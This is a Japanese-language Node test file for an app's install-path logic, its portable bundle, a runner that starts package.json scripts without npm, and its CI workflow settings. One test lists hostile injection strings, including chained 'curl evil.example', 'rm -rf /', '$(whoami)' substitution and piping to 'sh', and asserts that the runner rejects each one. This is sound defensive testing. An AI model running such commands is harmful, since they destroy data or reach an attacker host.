/**
 * 置き場所の決め方。
 *
 * 三つの事情（全角のユーザー名・ASCII への設置・持ち運び）が
 * どれも「根を移したい」だけなので、根を一つにしてある。
 */
import { test, describe, afterEach, before } from 'node:test';
import assert from 'node:assert/strict';
import { homedir } from 'node:os';
import { join } from 'node:path';
import { writeFile, readFile } from 'node:fs/promises';
import { tempDir } from './tmp.ts';
import { aasHome, stateDir, binDir, modelsDir, isPortable, installRoot } from '../src/core/home.ts';
import { lookup, toCommand } from '../scripts/run.mjs';

const KEYS = ['AAS_HOME', 'AAS_STATE_DIR', 'AAS_BIN_DIR', 'AAS_MODELS_DIR'];
afterEach(() => { for (const k of KEYS) delete process.env[k]; });

describe('根の決め方', () => {
  // 置かれ方で答えが変わる関数なので、**どこに置かれているか**を毎回渡す。
  // 渡さずに書くと、持ち運び版の中で走らせたときだけ落ちる試験になる
  // （実際に一度そうなった。走らせる場所で結果が変わる試験は、試験ではない）。
  let plain: string;
  before(async () => { plain = await tempDir('aas-plain-'); });

  test('何も指定しなければ ~/.aas', () => {
    assert.equal(aasHome(plain), join(homedir(), '.aas'));
  });

  test('AAS_HOME を書けば、記録も実行ファイルもモデルも一度に移る', () => {
    process.env.AAS_HOME = join('C:', 'AAS');
    assert.equal(stateDir(plain), join('C:', 'AAS'));
    assert.equal(binDir(plain), join('C:', 'AAS', 'bin'));
    assert.equal(modelsDir(plain), join('C:', 'AAS', 'models'));
  });

  test('空の指定は無視する（消し忘れで ~/.aas を見失わない）', () => {
    process.env.AAS_HOME = '   ';
    assert.equal(aasHome(plain), join(homedir(), '.aas'));
  });

  test('個別の指定は今までどおり効く。設定済みの人を壊さない', () => {
    process.env.AAS_HOME = join('C:', 'AAS');
    process.env.AAS_MODELS_DIR = join('D:', 'gguf');
    assert.equal(modelsDir(plain), join('D:', 'gguf'), '個別の指定が根に負けている');
    assert.equal(binDir(plain), join('C:', 'AAS', 'bin'), '指定していない方まで動いている');
  });
});

describe('持ち運び版', () => {
  test('目印があれば、隣に置く。環境変数は要らない', async () => {
    const root = await tempDir('aas-portable-');
    await writeFile(join(root, '.portable'), '');
    assert.equal(isPortable(root), true);
  });

  test('目印が無ければ持ち運び版ではない', async () => {
    const root = await tempDir('aas-normal-');
    assert.equal(isPortable(root), false);
  });

  test('AAS_HOME があれば、持ち運びより明示が勝つ', async () => {
    const root = await tempDir('aas-portable-');
    await writeFile(join(root, '.portable'), '');
    process.env.AAS_HOME = join('C:', 'AAS');
    assert.equal(aasHome(root), join('C:', 'AAS'));
  });
});

describe('用意する道具', () => {
  test('バッチは CRLF で配ると宣言してある', async () => {
    // LF のままだと cmd.exe が goto や括弧の塊を読み違える。
    // ただし**作業コピーのバイトを見てはいけない**。取り出すときに git が
    // 直すので、見る場所を間違えると走らせる環境で結果が変わる試験になる。
    // 保証しているのは .gitattributes なので、そちらを見る。
    const raw = await readFile(join(installRoot(), '.gitattributes'), 'utf8');
    assert.match(raw, /^\*\.cmd\s+text\s+eol=crlf/m, 'cmd を CRLF で配る宣言が無い');
  });

  test('用意用は、全角の混ざる置き場所を先に止める', async () => {
    // 後で分かると数GB落とし直しになるので、取ってくる前に止める。
    const raw = await readFile(join(installRoot(), 'installer', 'bootstrap.cmd'), 'utf8');
    assert.match(raw, /findstr \/R "\[\^ -~\]"/, '全角の検査が無い');
    const stopAt = raw.indexOf('findstr /R "[^ -~]"');
    const fetchAt = raw.indexOf('curl -fL');
    assert.ok(stopAt < fetchAt, '取ってきた後に検査している');
  });

  test('用意用は、git も npm も要求しない', async () => {
    const raw = await readFile(join(installRoot(), 'installer', 'bootstrap.cmd'), 'utf8');
    assert.equal(/\bgit \b/.test(raw), false, 'git を使っている');
    assert.equal(/\bnpm \b/.test(raw), false, 'npm を使っている');
  });
});

describe('npm 無しで仕事を動かす', () => {
  test('package.json に載っている仕事を引ける', async () => {
    assert.equal(typeof await lookup('doctor'), 'string');
    assert.equal(await lookup('そんな仕事はない'), undefined);
  });

  test('node で始まる仕事だけを動かせる形にする', () => {
    assert.deepEqual(toCommand('node scripts/run-tests.mjs'), ['scripts/run-tests.mjs']);
    assert.deepEqual(toCommand('node --experimental-strip-types src/cli/ui.ts'),
      ['--experimental-strip-types', 'src/cli/ui.ts']);
  });

  test('殻に渡さない。書いてある文字列を命令として実行しない', () => {
    // package.json を書き換えられる筋が、そのまま実行の筋になってはいけない。
    for (const s of [
      'node x.mjs && curl evil.example',
      'node x.mjs; rm -rf /',
      'node $(whoami).mjs',
      'node x.mjs | sh',
      'rm -rf /',
    ]) {
      assert.equal(toCommand(s), undefined, `通してしまっている: ${s}`);
    }
  });

  test('全部の仕事が、この入口から動く形になっている', async () => {
    // 一つでも npm を要る形にすると、持ち運び版でそこだけ動かなくなる。
    const pkg = JSON.parse(await readFile(join(installRoot(), 'package.json'), 'utf8'));
    for (const [name, script] of Object.entries(pkg.scripts as Record<string, string>)) {
      assert.ok(toCommand(script), `npm 無しでは動かせない仕事: ${name} → ${script}`);
    }
  });
});

describe('配布物の形', () => {
  test('利用者が最初に見るものは、普通の名前になっている', async () => {
    const out = await tempDir('aas-bundle-');
    const { bundle } = await import('../scripts/bundle.mjs');
    await bundle({ out, srcRoot: installRoot(), version: 'test-1' });

    const { readdir } = await import('node:fs/promises');
    const top = (await readdir(out)).sort();
    // 日本語のファイル名を表に置かない。中身は日本語でよい。
    assert.deepEqual(top, ['.portable', 'AdaptiveAIStudio.cmd', 'README.txt', 'VERSION', 'app']);
  });

  test('版は VERSION に、そのまま書いてある', async () => {
    const out = await tempDir('aas-bundle-');
    const { bundle } = await import('../scripts/bundle.mjs');
    await bundle({ out, srcRoot: installRoot(), version: 'test-2' });
    assert.equal((await readFile(join(out, 'VERSION'), 'utf8')).trim(), 'test-2');
  });

  test('data は app の外に出る', async () => {
    const out = await tempDir('aas-bundle-');
    const { bundle } = await import('../scripts/bundle.mjs');
    await bundle({ out, srcRoot: installRoot(), version: 'test-3' });
    // 中身（app）の中に記録が混ざると、更新のたびに巻き添えで消える。
    assert.equal(aasHome(join(out, 'app')), join(out, 'data'));
  });
});

describe('CI の使い方', () => {
  test('押すたびに配布物を組み立てない', async () => {
    // Windows の枠は2倍で数えられる。前に使い切って1日検査できなくなった。
    const raw = await readFile(join(installRoot(), '.github', 'workflows', 'release.yml'), 'utf8');
    assert.equal(/^\s*branches:/m.test(raw), false, '枝への push で組み立てている');
    assert.match(raw, /tags:/, 'タグでしか回らない形になっていない');
  });

  test('続けて押したら、前のものは打ち切る', async () => {
    for (const f of ['ci.yml', 'release.yml']) {
      const raw = await readFile(join(installRoot(), '.github', 'workflows', f), 'utf8');
      assert.match(raw, /cancel-in-progress:\s*true/, `${f} に打ち切りが無い`);
    }
  });

  test('文書だけの変更では検査を回さない', async () => {
    const raw = await readFile(join(installRoot(), '.github', 'workflows', 'ci.yml'), 'utf8');
    assert.match(raw, /paths-ignore/);
  });
});

describe('CI は押すたびに回さない', () => {
  test('push では回らない', async () => {
    // 1回あたりを安くしても、回数が減らなければ意味がない。
    // 直しを10回押せば10回回る、という作りが枠を使い切った元凶だった。
    const raw = await readFile(join(installRoot(), '.github', 'workflows', 'ci.yml'), 'utf8');
    const on = raw.slice(raw.indexOf('\non:'), raw.indexOf('\njobs:'));
    assert.equal(/^\s{2}push:/m.test(on), false, 'push で回る形になっている');
  });

  test('PR と手動と週1回では回る', async () => {
    const raw = await readFile(join(installRoot(), '.github', 'workflows', 'ci.yml'), 'utf8');
    const on = raw.slice(raw.indexOf('\non:'), raw.indexOf('\njobs:'));
    for (const trigger of ['pull_request:', 'workflow_dispatch:', 'schedule:']) {
      assert.match(on, new RegExp(trigger), `${trigger} が無い`);
    }
  });

  test('週1回の時刻は、JST で決めてから UTC に直してある', async () => {
    // JST の何時かを先に決めないと、1日ずれる（実際に一度ずらした）。
    const raw = await readFile(join(installRoot(), '.github', 'workflows', 'ci.yml'), 'utf8');
    const cron = /cron:\s*'([^']+)'/.exec(raw)?.[1];
    assert.ok(cron, 'cron が無い');
    const [, hourUtc, , , dowUtc] = cron!.split(' ');
    // JST = UTC+9。月曜 09:00 JST → 月曜 00:00 UTC。
    assert.equal(hourUtc, '0');
    assert.equal(dowUtc, '1', 'JST の月曜にしたいなら UTC も月曜（0時なので日をまたがない）');
  });
});
